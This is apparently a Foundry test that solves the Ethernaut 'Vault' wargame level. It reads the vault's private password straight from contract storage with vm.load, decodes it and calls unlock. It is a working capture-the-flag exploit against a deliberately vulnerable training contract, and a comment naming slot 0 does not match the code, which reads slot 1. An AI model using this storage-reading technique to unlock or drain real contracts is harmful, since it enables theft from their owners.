pragma solidity ^0.8.19;

import "ds-test/test.sol";
import "../../src/Vault/VaultFactory.sol";
import "../../src/Ethernaut.sol";
import "../../src/test/utils/vm.sol";
// import "../../src/Force/ThisIsNothing.sol";

contract VaultTestz is DSTest {
    Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
    Ethernaut ethernaut;
    Vault vault;
    address eoaAddress = address(100);

    function setUp() public {
        // Setup instance of the Ethernaut contract
        ethernaut = new Ethernaut();
        // Deal EOA address some ether
        vm.deal(eoaAddress, 5 ether);
    }

    function testVaultRead() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////

        VaultFactory vaultFactory = new VaultFactory();
        ethernaut.registerLevel(vaultFactory);
        vm.startPrank(eoaAddress);
        address levelAddress = ethernaut.createLevelInstance(vaultFactory);
        Vault ethernautVault = Vault(payable(levelAddress));
        // attack
        // use vm.load to access slot 0 of the contract
        bytes32 passwordz = vm.load(address(ethernautVault), bytes32(uint256(1)));
        emit log_bytes32(passwordz);

        uint8 i = 0;
        while (i < 32 && passwordz[i] != 0) {
            i++;
        }
        bytes memory bytesArray = new bytes(i);
        for (i = 0; i < 32 && passwordz[i] != 0; i++) {
            bytesArray[i] = passwordz[i];
        }
        emit log_string(string(bytesArray));
        ethernautVault.unlock(passwordz);
        // submit level instance
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
